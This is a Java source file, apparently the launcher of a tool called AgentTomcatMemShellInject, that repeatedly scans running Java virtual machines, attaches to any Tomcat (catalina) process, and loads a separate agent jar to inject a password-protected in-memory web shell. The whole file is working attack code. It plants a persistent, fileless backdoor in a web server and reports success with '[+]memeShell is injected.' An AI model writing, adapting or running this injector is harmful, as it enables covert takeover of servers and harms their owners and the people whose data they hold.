package me.mole;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.util.List;

public class AttachApp {
    public static void main(String[] args) throws Exception {

        if (args.length != 1) {
            System.out.println("Usage:java -jar AgentTomcatMemShellInject.jar password");
            return;
        }
        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList = null;
        String password = args[0];
        String currentPath = AttachApp.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        String agentFile = currentPath + "AgentTomcatMemShell.jar";
        agentFile = new File(agentFile).getCanonicalPath();
        String agentArgs = currentPath;
        if (!password.equals("") || password != null) {
            agentArgs = agentArgs + "^" + password;
        }

        while (true) {
            try {
                vmList = VirtualMachine.list();
                if (vmList.size() <= 0)
                    continue;
                for (VirtualMachineDescriptor vmd : vmList) {
                    System.out.println("vmd.displayName=" + vmd.displayName());
                    if (vmd.displayName().indexOf("catalina") >= 0 || vmd.displayName().equals("")) {
                        vm = VirtualMachine.attach(vmd);

                        //ADD for tomcat windows service,dispayname is blank string and has key "catalina.home".
                        if (vmd.displayName().equals("") && vm.getSystemProperties().containsKey("catalina.home") == false)
                            continue;

                        System.out.println("----- vmd.displayName=" + vmd.displayName());
                        System.out.println("[+]OK.i find a jvm.");
                        Thread.sleep(1000);
                        if (null != vm) {
                            System.out.println("agentFile=" + agentFile);
                            System.out.println("agentArgs=" + agentArgs);
                            vm.loadAgent(agentFile, agentArgs);
                            System.out.println("[+]memeShell is injected.");
                            vm.detach();
                            return;
                        }
                    }
                }
                Thread.sleep(3000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
